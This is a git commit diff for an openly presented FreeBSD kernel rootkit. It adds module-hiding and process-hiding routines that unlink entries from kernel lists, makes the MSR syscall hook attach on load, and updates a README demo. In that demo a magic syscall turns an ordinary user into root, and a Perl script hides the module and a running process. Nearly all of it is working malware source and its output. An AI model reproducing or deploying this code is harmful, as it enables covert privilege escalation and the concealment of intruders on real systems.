b0456053effdc512b03ddfc60afab854e9ba21e2
Anderson Eduardo <andersonc0d3@gmail.com>
2014-12-30 23:25:36 -0300

    two new features added

--- README.md
+++ README.md
@@ -1,26 +1,70 @@
-This is a POC for a *rootkit* that I wrote a long time ago that overwrites the MSR and hijack the interrupt handler in order to provide a 'hidden' way to escalate the privileges. Additionally, the rootkit adds a new syscall that was created to handle the rootkit. This new syscall receives one argument, 1 or 0, enabling or disabling the rootkit.
+This is a small rootkit for FreeBSD 10 AMD64. Initially, it was just a POC for a rootkit I've written to test some stuff in MSR (Model Specific Registers) a long time ago but now I have added more two features in it. Now it can be used to hide a module or process and escalate the privileges to root. There's an easy way to know if this rootkit is already on the system, you just need to load the module again and the kernel will tell you if the file exists or not.
+
+It has been tested on FreeBSD 10.0-RELEASE AMD64.
 
 Demonstration:
+
 ```
-$ uname -a
-FreeBSD rootkit 10.0-RELEASE FreeBSD 10.0-RELEASE #5: Wed Nov 26 17:05:04 BRT 2014     andersonc0d3@rootkit:/usr/obj/usr/src/sys/DEBUG  amd64
-$ cat /etc/master.passwd
-cat: /etc/master.passwd: Permission denied
+$ su
+Password:
+root@rootkit:/usr/home/andersonc0d3 # kldload rootkit_amd64/rk.ko 
+root@rootkit:/usr/home/andersonc0d3 # exit
+exit
+$ cd rootkit_amd64
+$ cat hideme.c
+int main(void){
+	while(1);
+	return 0;
+}
+$ ./hideme &
+$ echo $!
+985
+$ ps -p 985
+PID TT  STAT    TIME COMMAND
+985  0  R    0:06.57 ./hideme
+$ kldstat
+Id Refs Address            Size     Name
+ 1    6 0xffffffff80200000 16314c0  kernel
+ 2    1 0xffffffff81a12000 2a53     uhid.ko
+ 3    1 0xffffffff81a15000 4b0      rk.ko
+$ cat exec.pl
+#!/usr/bin/perl
+
+use strict;
+use warnings;
+
+my $a="rk";
+my $b="./hideme";
+
+# syscall(210,1)  # hook the interrupt handler
+#
+# syscall (210,0) # remove the hook from interrupt handler
+#
+# call syscall to hide a module
+#
+
+syscall(210,3,$a);
+
+# call syscall to hide a process
+#
+#
+syscall(210,4,$b);
+$ perl exec.pl
+$ ps -p 985
+PID TT  STAT TIME COMMAND
+$ kldstat
+Id Refs Address            Size     Name
+ 1    6 0xffffffff80200000 16314c0  kernel
+ 2    1 0xffffffff81a12000 2a53     uhid.ko
 $ id
 uid=1001(andersonc0d3) gid=1001(andersonc0d3) groups=1001(andersonc0d3),0(wheel)
-$ kldstat -v|grep rk.ko
- 7    1 0xffffffff81a63000 2a0      rk.ko (./rk.ko)
-$ perl -e 'syscall(210,1)'
-$ cd rootkit_amd64
 $ cat getroot.c
 #include <stdio.h>
 #include <stdlib.h>
 
 int main(void){
 	
-	printf("uid: %d\n",getuid());
-
-	asm("mov $0x31337,%rax");
+	asm("mov $0x31337,%rax");	
 	asm("syscall");
 
 	return 0;
@@ -29,5 +73,6 @@ $ ./getroot
 uid: 1001
 $ id
 uid=0(root) gid=0(wheel) groups=0(wheel)
-$
+$ su
+root@rootkit:/usr/home/andersonc0d3/rootkit_amd64 #
 ```
--- rk.c
+++ rk.c
@@ -1,29 +1,123 @@
+#include <sys/param.h>
 #include <sys/types.h>
 #include <sys/module.h>
 #include <sys/sysproto.h>
+#include <sys/linker.h>
 #include <sys/sysent.h>
 #include <sys/kernel.h>
 #include <sys/systm.h>
 #include <machine/specialreg.h>
+#include <sys/proc.h>
+#include <sys/queue.h>
 
 extern u_int64_t hook_fast_syscall, hook_fast_syscall32;
 extern u_int64_t Xfast_syscall, Xfast_syscall32;
 
 struct rk_args{
 	int cmd;
+	char *arg1;
 };
 
 static void attach_rk(void);
 static void detach_rk(void);
+static int hide_module(char *);
+static int hide_process(char *);
 
 int status = 0;
 
+struct module {
+	TAILQ_ENTRY(module)     link;   /* chain together all modules */
+	TAILQ_ENTRY(module)     flink;  /* all modules in a file */
+	struct linker_file      *file;  /* file which contains this module */
+	int                     refs;   /* reference count */
+	int                     id;     /* unique id number */
+	char                    *name;  /* module name */
+	modeventhand_t          handler;        /* event handler */
+	void                    *arg;   /* argument for handler */
+	modspecific_t           data;   /* module specific data */
+};
+
+extern TAILQ_HEAD(modulelist, module) modules;
+extern linker_file_list_t linker_files;
+
+static int hide_module(char *module_name){
+
+	module_t mod;
+        linker_file_t lf;
+	int len;
+	char buffer[20];	// this need to be changed
+
+	if(module_name == NULL){
+		return -1;
+	}
+
+	len = strlen(module_name);
+
+	if(len > 16){
+		return -1;
+	}
+
+	TAILQ_FOREACH(mod, &modules, link) {
+		if(strcmp(mod->name,module_name) == 0){
+			TAILQ_REMOVE(&modules,mod,link);
+			break;
+		}
+	}
+
+	memset(buffer,'\0',sizeof(buffer));
+
+	sprintf(buffer,"%s.ko",module_name);
+
+	TAILQ_FOREACH(lf, &linker_files, link){
+		if (strcmp(lf->filename,buffer) == 0){
+			TAILQ_REMOVE(&linker_files,lf,link);
+			break;
+		}
+	}
+
+	return 0;
+}
+
+
+static int hide_process(char *process_name){
+	         struct proc *process;
+
+                 LIST_FOREACH(process, &allproc, p_list){
+	                 if(process->p_args != NULL){
+		                 if (strcmp(process->p_args->ar_args,process_name) == 0){ 
+	                        	(&pidhashtbl[process->p_pid & pidhash])->lh_first = 0;
+					LIST_REMOVE(process,p_list);
+					break;
+				 }
+			 }
+		 }   
+return 0;
+}
+
 static int main(struct thread *td, struct rk_args *arg){
 
-	if(arg->cmd == 1 && status == 0)
-		attach_rk();
-	else if(arg->cmd == 0 && status == 1)
-		detach_rk();
+	switch(arg->cmd){
+		case 1:
+			if(status == 0){
+				attach_rk();
+			}
+		break;
+		case 2:
+			if(status == 1){
+				detach_rk();
+			}
+		break;
+		case 3:
+			if(arg->arg1 != NULL){
+				hide_module(arg->arg1);
+			}
+		break;
+		case 4:
+			if(arg->arg1 != NULL){
+				hide_process(arg->arg1);
+			}
+		break;
+	}
 
 	return 0;
 }
@@ -41,7 +135,7 @@ static void detach_rk(void){
 }
 
 static struct sysent func_sysent = {
-	1,
+	2,
 	(sy_call_t *)main
 };
 
@@ -54,7 +148,7 @@ static int load (struct module *module, int cmd, void *arg)
 	switch (cmd)
 	{
 		case MOD_LOAD:
-
+			attach_rk();
 		break;
 		case MOD_UNLOAD:
 			detach_rk();
